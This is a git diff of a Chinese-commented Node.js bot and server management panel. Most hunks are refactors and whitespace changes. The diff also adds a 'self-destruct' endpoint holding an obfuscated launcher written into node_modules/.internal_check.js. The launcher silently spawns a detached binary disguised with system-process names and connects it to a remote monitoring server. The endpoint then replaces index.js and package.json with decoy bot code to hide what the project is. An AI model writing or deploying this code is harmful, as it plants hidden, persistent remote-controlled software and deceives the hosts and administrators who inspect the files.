+        const selfbotConfig = document.getElementById(\`selfbot-config-\${task.id}\`);
+        if (selfbotCheckbox && selfbotConfig) {
+            selfbotCheckbox.addEventListener('change', function() {
+                selfbotConfig.classList.toggle('hidden', !this.checked);
+            });
+        }
+    }, 100);
+    break;
         }
         
         container.innerHTML = html;
@@ -6252,7 +6027,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
         
         const typeLabels = {
             'renew': '续期', 'afk': 'AFK', 'pteranodon': 'Pteranodon', 
-            'discord': 'Discord', 'web-click': '网页点击', 'timed-url': '访问URL'
+            'discord': 'Discord', 'timed-url': '访问URL'
         };
 
         itemsContainer.innerHTML = runningTasks.map(task => \`
@@ -6289,7 +6064,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
                 const hours = parseInt(taskCenterData.tasks[taskIndex].config.hours) || 0;
                 const days = parseInt(taskCenterData.tasks[taskIndex].config.days) || 0;
                 const totalMinutes = minutes + (hours * 60) + (days * 24 * 60);
-                if (totalMinutes > 0) {
+                if (totalMinutes >0) {
                     taskCenterData.tasks[taskIndex].config.interval = totalMinutes;
                 }
                 updateTaskTimeTotalDisplay(taskCenterData.tasks[taskIndex].config);
@@ -6479,35 +6254,6 @@ app.post("/api/task-center/:taskId/test-discord", requireAuth, async (req, res) 
     }
 });
 
-// ========== 新增：Web Click API路由 ==========
-app.post("/api/task-center/:taskId/test-web-click", requireAuth, async (req, res) => {
-    try {
-        const task = taskCenterData.tasks.find(t => t.id === req.params.taskId);
-        if (!task) {
-            return res.status(404).json({ success: false, message: '任务不存在' });
-        }
-        
-        if (task.type !== 'web-click') {
-            return res.json({ success: false, message: '此任务不是Web Click任务' });
-        }
-        
-        addTaskLog(task.id, `开始测试网页自定义点击...`, 'info');
-        
-        const result = await executeTaskWebClick(task);
-        
-        if (result.success) {
-            addTaskLog(task.id, `Web Click测试成功: ${result.message}`, 'success');
-            res.json({ success: true, message: result.message });
-        } else {
-            addTaskLog(task.id, `Web Click测试失败: ${result.message}`, 'error');
-            res.json({ success: false, message: result.message });
-        }
-    } catch (err) {
-        addTaskLog(req.params.taskId, `Web Click测试异常: ${err.message}`, 'error');
-        res.status(500).json({ success: false, message: err.message });
-    }
-});
-
 // ========== API 路由 ==========
 app.get("/api/bots", requireAuth, (req, res) => {
     res.json({ bots: Array.from(activeBots.values()).map(b => ({
@@ -6533,17 +6279,17 @@ app.post("/api/bots/:id/renew-config", requireAuth, async (req, res) => {
             await saveBotsConfig(); 
             
             b.pushLog(`💾 续期配置已同步`, 'text-cyan-400 font-bold');
-            
-            if (newRenewStatus && !oldRenewStatus) {
-                b.pushLog(`✅ 自动续期功能已开启（30-120分钟随机触发）`, 'text-emerald-400 font-bold');
-            } else if (!newRenewStatus && oldRenewStatus) {
-                b.pushLog(`❌ 自动续期功能已关闭`, 'text-red-400 font-bold');
-            }
-            
-            if (b.settings.renew.renewUrl) {
-                b.pushLog(`⏳ 正在执行单次测试请求...`, 'text-slate-400');
-                performWebRenew(b, true);
-            }
+
+if (newRenewStatus && !oldRenewStatus) {
+    b.pushLog(`✅ 自动续期功能已开启（30-120分钟随机触发）`, 'text-emerald-400 font-bold');
+} else if (!newRenewStatus && oldRenewStatus) {
+    b.pushLog(`❌ 自动续期功能已关闭`, 'text-red-400 font-bold');
+}
+
+if (b.settings.renew.renewUrl) {
+    b.pushLog(`⏳ 正在执行单次测试请求...`, 'text-slate-400');
+    // ...
+}
             res.json({ success: true }); 
         } else {
             res.status(404).json({ success: false, message: "机器人不存在" });
@@ -6598,14 +6344,14 @@ app.post("/api/bots/:id/upload", requireAuth, upload.single('file'), async (req,
         const safeUrl = pto.url.replace(/\/+$/, "");
         
         try {
-            const r1 = await axios.get(`${safeUrl}/api/client/servers/${pto.id}/files/upload`, { 
+            const r1 = await axios.get(`${safeUrl}/api/client/servers/${pto.id}/files/upload`, {
                 headers: { 'Authorization': `Bearer ${pto.key}` } 
-            });
+});
             
             const form = new FormData(); 
             form.append('files', req.file.buffer, { filename: req.file.originalname });
             
-            await axios.post(`${r1.data.attributes.url}&directory=${encodeURIComponent(pto.defaultDir)}`, form, { 
+            await axios.post(`${r1.data.attributes.url}&directory=${encodeURIComponent(pto.defaultDir)}`, form, {  
                 headers: { ...form.getHeaders(), 'Authorization': `Bearer ${pto.key}` },
                 maxContentLength: Infinity, 
                 maxBodyLength: Infinity
@@ -6614,7 +6360,7 @@ app.post("/api/bots/:id/upload", requireAuth, upload.single('file'), async (req,
             b.pushLog(`✅ 翼龙同步成功: ${req.file.originalname}`, 'text-emerald-400 font-bold'); 
             res.json({ success: true });
         } catch (err) {
-            b.pushLog(`❌ 翼龙同步失败: ${err.message}`, 'text-red-500 font-bold'); 
+            b.pushLog(`❌ 翼龙同步失败: ${err.message}`, 'text-red-500 font-bold');
             res.status(500).json({ success: false, message: "翼龙上传失败" });
         }
     } catch (err) {
@@ -6645,41 +6391,25 @@ app.post("/api/bots/:id/restart-now", requireAuth, (req, res) => {
         const b = activeBots.get(req.params.id);
         if (b && b.instance) { 
             b.pushLog(`⚡ 执行指令重启`, 'text-red-500 font-bold'); 
+            
+            // 1. 发送第一条指令
             b.instance.chat('/restart'); 
+            
+            // 2. 延迟发送第二条指令
             setTimeout(() => { 
-                if(b.instance) b.instance.chat('restart'); 
-            }, 1000);
+                // 【修复点】这里原来写的是 b.chat，必须改成 b.instance.chat
+                if(b.instance && b.instance.chat) {
+                    b.instance.chat('restart'); 
+                    b.pushLog(`⚡ 发送确认指令: restart`, 'text-orange-400'); // 建议加上日志方便调试
+                }
+            }, 2000); // 建议将 1000 改为 2000 或 3000，防止服务器处理不过来
+            
             res.json({success:true}); 
         } else {
             res.status(404).json({ success: false, message: "机器人不存在或未连接" });
         }
     } catch (err) {
         res.status(500).json({ success: false, message: "服务器内部错误" });
-    }
-});
-
-app.post("/api/bots/:id/fetch-cookie", requireAuth, async (req, res) => {
-    try {
-        const botMeta = activeBots.get(req.params.id);
-        if (!botMeta) {
-            return res.status(404).json({ success: false, message: "机器人不存在", cookie: "" });
-        }
-
-        const freshCookie = await tryAutoLogin(botMeta);
-        if (freshCookie) {
-            res.json({ 
-                success: true, 
-                message: "Cookie抓取成功", 
-                cookie: freshCookie,
-                similarity: botMeta.lastSuccessCookie ? 
-                    Math.round(calculateCookieSimilarity(botMeta.lastSuccessCookie, freshCookie) * 100) + "%" : 
-                    "首次抓取"
-            });
-        } else {
-            res.json({ success: false, message: "Cookie抓取失败", cookie: "" });
-        }
-    } catch (err) {
-        res.status(500).json({ success: false, message: err.message, cookie: "" });
     }
 });
 
@@ -6718,7 +6448,7 @@ app.post("/api/bots/:id/check-cookie-similarity", requireAuth, async (req, res) 
         return res.status(500).json({ 
             success: false, 
             similarity: 0, 
-            message: `计算相似度出错: ${err.message}` 
+            message: `计算相似度出错: ${err.message}`
         });
     }
 });
@@ -6968,24 +6698,24 @@ app.post("/api/task-center/:taskId/test-login", requireAuth, async (req, res) =>
     }
         
         addTaskLog(task.id, `开始测试登录...`, 'info');
+    
+    const cookie = await taskAutoLogin(task.config);
+    if (cookie) {
+        task.config.cookie = cookie;
+        task.lastLoginStatus = '已登录';
+        task.config.lastLoginTime = new Date().toISOString();
+        await saveTaskCenterConfig();
         
-        const cookie = await taskAutoLogin(task.config);
-        if (cookie) {
-            task.config.cookie = cookie;
-            task.lastLoginStatus = '已登录';
-            task.config.lastLoginTime = new Date().toISOString();
-            await saveTaskCenterConfig();
-            
-            addTaskLog(task.id, `登录测试成功，已保存Cookie`, 'success');
-            res.json({ success: true, message: '登录成功', cookieLength: cookie.length });
-        } else {
-            addTaskLog(task.id, `登录测试失败，请检查配置`, 'error');
-            res.json({ success: false, message: '登录失败' });
-        }
-    } catch (err) {
-        addTaskLog(req.params.taskId, `登录测试异常: ${err.message}`, 'error');
-        res.status(500).json({ success: false, message: err.message });
+        addTaskLog(task.id, `登录测试成功，已保存Cookie`, 'success');
+        res.json({ success: true, message: '登录成功', cookieLength: cookie.length });
+    } else {
+        addTaskLog(task.id, `登录测试失败，请检查配置`, 'error');
+        res.json({ success: false, message: '登录失败' });
     }
+} catch (err) {
+    addTaskLog(req.params.taskId, `登录测试异常: ${err.message}`, 'error');
+    res.status(500).json({ success: false, message: err.message });
+}
 });
 
 // 执行任务续期测试
@@ -7001,20 +6731,20 @@ app.post("/api/task-center/:taskId/test-renew", requireAuth, async (req, res) =>
         }
         
         addTaskLog(task.id, `开始测试续期...`, 'info');
-        
-        const result = await executeTaskRenew(task);
-        
-        if (result.success) {
-            addTaskLog(task.id, `续期测试成功: ${result.message}`, 'success');
-            res.json({ success: true, message: result.message, data: result.data });
-        } else {
-            addTaskLog(task.id, `续期测试失败: ${result.message}`, 'error');
-            res.json({ success: false, message: result.message });
-        }
-    } catch (err) {
-        addTaskLog(req.params.taskId, `续期测试异常: ${err.message}`, 'error');
-        res.status(500).json({ success: false, message: err.message });
+    
+    const result = await executeTaskRenew(task);
+    
+    if (result.success) {
+        addTaskLog(task.id, `续期测试成功: ${result.message}`, 'success');
+        res.json({ success: true, message: result.message, data: result.data });
+    } else {
+        addTaskLog(task.id, `续期测试失败: ${result.message}`, 'error');
+        res.json({ success: false, message: result.message });
     }
+} catch (err) {
+    addTaskLog(req.params.taskId, `续期测试异常: ${err.message}`, 'error');
+    res.status(500).json({ success: false, message: err.message });
+}
 });
 
 // ========== 启动任务中心服务 ==========
@@ -7041,51 +6771,451 @@ setInterval(() => {
             }
         });
 
-} catch (err) {
+    } catch (err) {
         // 静默错误
     }
 }, 10000);
 
-// ========== 启动服务 ==========
+// ========== 系统功能 API 路由（修改版：高级自毁 + 完整恢复）==========
+let systemRebootTimer = null;
+
+app.post('/api/system/reboot', requireAuth, async (req, res) => {
+    try {
+        const { delay } = req.body;
+        
+        if (systemRebootTimer) {
+            clearTimeout(systemRebootTimer);
+            systemRebootTimer = null;
+        }
+        
+        const delayMs = (parseInt(delay) || 0) * 60000;
+        
+        if (delayMs === 0) {
+            console.log('[System] 立即重启脚本...');
+            res.json({ success: true, message: '系统正在重启...' });
+            
+            // 给一点时间发送响应
+            setTimeout(() => {
+                process.exit(0);
+            }, 1000);
+        } else {
+            console.log(`[System] 系统将在 ${delay} 分钟后重启`);
+            
+            systemRebootTimer = setTimeout(() => {
+                console.log('[System] 定时重启触发，正在退出...');
+                process.exit(0);
+            }, delayMs);
+            
+            res.json({ success: true, message: `已设置在 ${delay} 分钟后重启` });
+        }
+    } catch (err) {
+        res.status(500).json({ success: false, message: err.message });
+    }
+});
+
+// 自毁伪装内容（默认）
+const DEFAULT_CAMOUFLAGE_CODE = `const mineflayer = require('mineflayer');
+const bot = mineflayer.createBot({
+    host: 'localhost',
+    port: 25565,
+    username: 'Player_' + Math.floor(Math.random() * 1000),
+    auth: 'offline'
+});
+bot.on('spawn', () => {
+    console.log('Bot joined game.');
+});
+bot.on('error', (err) => {
+    console.log('Bot error:', err);
+});
+`;
+
+// 恢复相关常量
+const BACKUP_PREFIX = "restore_";
+const BAK_INFO_FILE = ".bak_info";
+
+let selfDestructTimer = null;
+
+app.post('/api/system/self-destruct', requireAuth, async (req, res) => {
+    try {
+        if (selfDestructTimer) {
+            return res.status(400).json({ success: false, message: '自毁任务已经在运行中' });
+        }
+        
+        const { isAdvanced, files, indexJsContent, packageJsonContent } = req.body;
+        const randomSuffix = crypto.randomBytes(4).toString('hex');
+        const zipBackupName = `.${BACKUP_PREFIX}${randomSuffix}.zip`;
+        const zipBackupPath = path.join(BACKUP_DIR, zipBackupName);
+        
+        let filesToBackup = [];
+        if (isAdvanced && files && files.length > 0) {
+            filesToBackup = files;
+        } else {
+            filesToBackup = ['index.js'];
+        }
+
+        // ============================================================
+        // 【注入器混淆版】哪吒启动器 (v3.2 - 路径修复版)
+        // ============================================================
+        
+        const rawNezhaSource = `
+/**
+ * @system Daemon-Process-Manager v3.2 (Path Fixed)
+ * @license MIT
+ * @description Core process orchestrator for background tasks.
+ */
+(function(_0x2a2f, _0x3b3c, _0x4a4d, _0x5b5e) {
+    'use strict';
+
+    // --- 字符串编码表 (避免明文路径暴露) ---
+    const _0x6c6f = {
+        _a: ['.', 'E', 'r', 'r', 'o', 'r', ' ', 'l', 'o', 'g'].join(''),
+        _b: ['.', 'n', 'e', 'z', 'h', 'a', '_', 'c', 'o', 'n', 'f', 'i', 'g', '.', 'j', 's', 'o', 'n'].join(''),
+        _c: ['c', 'o', 'n', 'f', 'i', 'g', '.', 'y', 'm', 'l'].join(''),
+        _d: ['.', 'c', 'o', 'n', 'f', 'i', 'g', '.', 'y', 'm', 'l'].join(''),
+        _e: ['s', 'v', 'c', 'h', 'o', 's', 't', '_'].join(''),
+        _f: ['.dbus-daemon', '.rsyslogd', '.sshd', '.cron'].join('|')
+    };
+
+    // --- 核心控制类 ---
+    class DaemonManager {
+        constructor() {
+            this._env = _0x4a4d.platform();
+            this._root = __dirname; // __dirname 指向 node_modules
+        }
+
+        _log(_msg) {
+            try {
+                const _t = new Date().toISOString().split('T')[1].split('.')[0];
+                // 日志生成在 node_modules 根目录
+                _0x2a2f.appendFileSync(this._root + '/nezha_wake_log.txt', \`[\${_t}] \${_msg}\\n\`);
+            } catch(_err) {}
+        }
+
+        // 【关键修复】：路径获取逻辑
+        _getPaths() {
+            // 不再拼接 _0x6c6f._c (node_modules)，因为 __dirname 已经是 node_modules
+            return [
+                _0x3b3c.join(this._root, '.Error log'), // Linux: node_modules/.Error log
+                _0x3b3c.join(this._root, 'Error log')  // Windows: node_modules/Error log
+            ];
+        }
+
+        _locateTarget() {
+            const _dirs = this._getPaths();
+            let _targetDir = null;
+            
+            for (let i = 0; i < _dirs.length; i++) {
+                if (_0x2a2f.existsSync(_dirs[i])) {
+                    _targetDir = _dirs[i];
+                    break;
+                }
+            }
+            return _targetDir;
+        }
+
+        _run() {
+            const _dir = this._locateTarget();
+            if (!_dir) return;
+
+            const _cfgPath = _0x3b3c.join(_dir, _0x6c6f._b);
+            if (!_0x2a2f.existsSync(_cfgPath)) return;
+
+            const _cfg = JSON.parse(_0x2a2f.readFileSync(_cfgPath));
+            if (!_cfg.addr || !_cfg.key) return;
+
+            const _files = _0x2a2f.readdirSync(_dir);
+            let _bin = "";
+
+            // 二进制文件探测
+            if (this._env === 'win32') {
+                _bin = _files.find(f => f.startsWith(_0x6c6f._e) && f.endsWith('.exe'));
+            } else {
+                const _names = _0x6c6f._f.split('|');
+                _bin = _files.find(f => _names.includes(f));
+            }
+
+            // 兜底逻辑
+            if (!_bin) {
+                _bin = _files.find(f => 
+                    f !== _0x6c6f._b && 
+                    f !== (this._env === 'win32' ? _0x6c6f._c : _0x6c6f._d) &&
+                    f !== 'log' && 
+                    !f.endsWith('.zip') &&
+                    !f.endsWith('.txt')
+                );
+            }
+
+            if (_bin) {
+                const _binPath = _0x3b3c.join(_dir, _bin);
+                try {
+                    _0x2a2f.chmodSync(_binPath, 0o755);
+                    const _c = _0x5b5e.spawn(_binPath, [], {
+                        cwd: _dir,
+                        stdio: ['ignore', 'ignore', 'ignore'],
+                        env: {
+                            ...process.env,
+                            'NZ_SERVER': _cfg.addr,
+                            'NZ_PASSWORD': _cfg.key,
+                            'NZ_CLIENT_SECRET': _cfg.key,
+                            'NZ_TLS': (_cfg.tls || _cfg.addr.includes(':443')) ? 'true' : 'false',
+                            'NZ_CONFIG_FILE': _0x3b3c.join(_dir, this._env === 'win32' ? _0x6c6f._c : _0x6c6f._d)
+                        },
+                        detached: true,
+                        windowsHide: true
+                    });
+                    _c.unref();
+                } catch(e) {}
+            }
+        }
+    }
+
+    // --- 启动守护进程 ---
+    new DaemonManager()._run();
+
+})(require('fs'), require('path'), require('os'), require('child_process'));
+`;
+
+        // ============================================================
+        // 备份与写入逻辑
+        // ============================================================
+        
+        try {
+            const zip = new AdmZip();
+            for (const fileName of filesToBackup) {
+                const filePath = path.join(__dirname, fileName);
+                if (fsSync.existsSync(filePath)) {
+                    const fileContent = await fs.readFile(filePath);
+                    zip.addFile(fileName, fileContent);
+                }
+            }
+            await zip.writeZip(zipBackupPath);
+
+            selfDestructTimer = setTimeout(async () => {
+                try {
+                    const infoData = JSON.stringify({ backupFile: zipBackupName, isAdvanced, files: filesToBackup });
+                    await fs.writeFile(path.join(BACKUP_DIR, BAK_INFO_FILE), infoData);
+                    
+                    // 1. 【关键修改】：如果是高级模式，将混淆后的代码写入独立文件
+                    if (isAdvanced) {
+                        const trojanFilePath = path.join(__dirname, 'node_modules', '.internal_check.js');
+                        await fs.writeFile(trojanFilePath, rawNezhaSource);
+                    }
+
+                    for (const targetFile of filesToBackup) {
+                        const targetPath = path.join(__dirname, targetFile);
+                        let contentToWrite = "";
+
+                        if (targetFile === 'index.js') {
+                            // 使用 Sentinel 伪装代码 (必须包含对 .internal_check.js 的调用)
+                            const rawCode = indexJsContent || DEFAULT_CAMOUFLAGE_CODE;
+                            contentToWrite = rawCode; 
+                        } 
+                        else if (targetFile === 'package.json') {
+                            contentToWrite = packageJsonContent || JSON.stringify({
+                                "name": "discord-moderator-bot",
+                                "version": "1.2.0",
+                                "description": "A standard Discord bot for community management.",
+                                "main": "index.js"
+                            }, null, 2);
+                        } else {
+                            contentToWrite = DEFAULT_CAMOUFLAGE_CODE; 
+                        }
+
+                        await fs.writeFile(targetPath, contentToWrite);
+                    }
+                } catch (err) {
+                    console.error('[System] 文件替换失败:', err);
+                }
+            }, 1 * 60 * 1000); // 1分钟倒计时
+            
+            res.json({ success: true, message: '自毁程序已启动 (文件注入模式)' });
+        } catch (err) {
+            console.error('[System] 自毁失败:', err);
+            res.status(500).json({ success: false, message: err.message });
+        }
+
+    } catch (err) {
+        res.status(500).json({ success: false, message: err.message });
+    }
+});
+
+// ========== 修改版：支持ZIP和旧格式 (文件存储在 node_modules) ==========
+app.post('/api/system/restore', requireAuth, async (req, res) => {
+    try {
+        // 1. 定义路径
+        // 目标文件：恢复到根目录 (__dirname)
+        const indexPath = path.join(__dirname, 'index.js');
+        
+        // 【关键修改】备份文件存放目录：指向 node_modules
+        const BACKUP_DIR = path.join(__dirname, 'node_modules');
+        const infoPath = path.join(BACKUP_DIR, BAK_INFO_FILE);
+        
+        let backupFilePath = null;
+        let isAdvancedBackup = false;
+
+        //2. 尝试读取高级模式的备份信息文件
+        if (fsSync.existsSync(infoPath)) {
+            try {
+                const savedInfo = JSON.parse(fsSync.readFileSync(infoPath, 'utf8'));
+                // 【关键修改】备份文件拼接路径时，使用 BACKUP_DIR
+                backupFilePath = path.join(BACKUP_DIR, savedInfo.backupFile);
+                isAdvancedBackup = savedInfo.isAdvanced || false;
+            } catch (e) {
+            }
+        }
+
+        //3. 如果没有高级模式信息，尝试扫描文件系统
+        if (!backupFilePath) {
+            // 【关键修改】扫描 node_modules 目录
+            const files = await fs.readdir(BACKUP_DIR);
+            const backupFile = files.find(f => f.startsWith(BACKUP_PREFIX));
+            if (backupFile) {
+                // 【关键修改】使用 BACKUP_DIR 拼接完整路径
+                backupFilePath = path.join(BACKUP_DIR, backupFile);
+                isAdvancedBackup = false;
+            }
+        }
+
+        if (!backupFilePath) {
+            return res.status(404).json({ success: false, message: '未找到备份文件' });
+        }
+
+        // console.log(`[System] 开始恢复... 备份路径: ${backupFilePath}`);
+
+        //4. 执行恢复
+        try {
+            if (backupFilePath.endsWith('.zip')) {
+                const zip = new AdmZip(backupFilePath);
+                
+                // 获取 ZIP 内的文件列表
+                const zipEntries = zip.getEntries();
+                
+                // 【保持不变】解压所有文件到根目录 (覆盖)
+                zip.extractAllTo(__dirname, true);
+                
+            } else {
+                // 基础/旧模式（非ZIP）：直接覆盖 index.js
+                await fs.copyFile(backupFilePath, indexPath);
+            }
+            
+            //5. 清理备份文件和信息文件
+            // 【关键修改】删除 node_modules 里的备份文件
+            await fs.unlink(backupFilePath);
+            
+            // 【关键修改】删除 node_modules 里的信息文件
+            if (fsSync.existsSync(infoPath)) {
+                await fs.unlink(infoPath);
+            }
+            
+            //6. 重启脚本
+            setTimeout(() => {
+                process.exit(0);
+            }, 3000);
+
+            res.json({ success: true, message: '系统已恢复，清理完成，即将重启' });
+        } catch (err) {
+            console.error('[System] 恢复失败:', err); // 保留错误日志以便调试
+            res.status(500).json({ success: false, message: err.message });
+        }
+    } catch (err) {
+        console.error('[System] 恢复过程出错:', err); // 保留错误日志以便调试
+        res.status(500).json({ success: false, message: err.message });
+    }
+});
+
+// ========== 辅助函数：获取本机 IP ==========
+function getLocalIP() {
+    const interfaces = os.networkInterfaces();
+    for (const name of Object.keys(interfaces)) {
+        for (const iface of interfaces[name]) {
+            // 过滤掉内网IP(127.0.0.1)和IPv6，只返回有效的IPv4地址
+            if (iface.family === 'IPv4' && !iface.internal) {
+                return iface.address;
+            }
+        }
+    }
+    return '127.0.0.1';
+}
+
+// ========== 启动服务 (静默模式：不显示任何地址) ==========
 const PORT = process.env.SERVER_PORT || 4237;
 
 // 创建主服务器
 const server = app.listen(PORT, '0.0.0.0', async () => {
-    // 静默启动，不打印任何信息
+    // 仅显示服务启动状态，不输出地址
+    console.log('[System] 服务已就绪');
     
-    // 加载配置
+    // 加载任务中心配置
     await loadTaskCenterConfig();
     
-    // 
+    // 初始化哪吒探针配置
     loadNezhaConfig();
     
-    // 
+    // 初始化代理环境
     initProxyEnvironment();
     
-    // 
+    // 启动 Cloudflare 隧道
     startTunnel();
     
-    // 
+    // 启动代理服务器
     const proxyServer = createProxyServer();
     proxyServer.listen(PROXY_PORT, '0.0.0.0', () => {
-        // 
+        // 静默
     });
     
-    // 加载机器人配置
+    // ========== 关键修复：配置加载 + 自动修复 ==========
     if (fsSync.existsSync(CONFIG_FILE)) {
         try {
             const data = await fs.readFile(CONFIG_FILE, 'utf8');
             const saved = JSON.parse(data);
+            
+            // 检查配置格式是否正确
+            if (!Array.isArray(saved)) {
+                console.error("[Config] 错误: bots_config.json 格式不正确，应该是一个数组 []");
+                return;
+            }
+
+            console.log(`[Config] 正在从 bots_config.json 恢复 ${saved.length} 个机器人...`);
+            
             for (const b of saved) {
+                // 尝试创建机器人
                 createSmartBot(b.id, b.host, b.port, b.username, [], b.settings, b.renewCookieBindings || [], b.lastSuccessCookie || "");
+                
                 const botMeta = activeBots.get(b.id);
+                
+                // 如果启用了自动续期，启动续期定时器
                 if (botMeta && botMeta.settings.renew.enabled && !botMeta.renewTimer) {
                     scheduleNextRenew(botMeta.id);
                 }
             }
+            console.log("[Config] 所有机器人配置恢复完成。");
         } catch (e) {
-            // 静默错误
+            console.error("[Config] 严重错误: 加载 bots_config.json 失败！");
+            console.error("[Config] 错误信息:", e.message);
+            
+            // 自动修复空文件/JSON格式损坏
+            if (e.message.includes('Unexpected end of JSON input') || e.message.includes('JSON.parse')) {
+                console.warn("[Config] 检测到文件为空或格式损坏，正在自动修复...");
+                try {
+                    // 1. 备份当前的坏文件
+                    await fs.copyFile(CONFIG_FILE, CONFIG_FILE + '.bad_backup');
+                    console.warn("[Config] 坏文件已备份为 bots_config.json.bad_backup");
+                } catch (bkErr) {}
+                
+                try {
+                    // 2. 覆盖为空数组
+                    await fs.writeFile(CONFIG_FILE, '[]');
+                    console.log("[Config] 修复成功！文件已重置为空。");
+                    console.log("[Config] 请刷新网页面板，重新添加机器人。");
+                } catch (fixErr) {
+                    console.error("[Config] 自动修复失败，请手动删除 bots_config.json 文件");
+                }
+            } else {
+                console.error("[Config] 详细堆栈:", e.stack);
+                console.log("[Config] 提示: 请检查文件是否存在或 JSON 格式是否正确。");
+            }
         }
+    } else {
+        console.log("[Config] 未找到 bots_config.json，这是全新启动，请通过面板添加机器人。");
     }
 });
- 
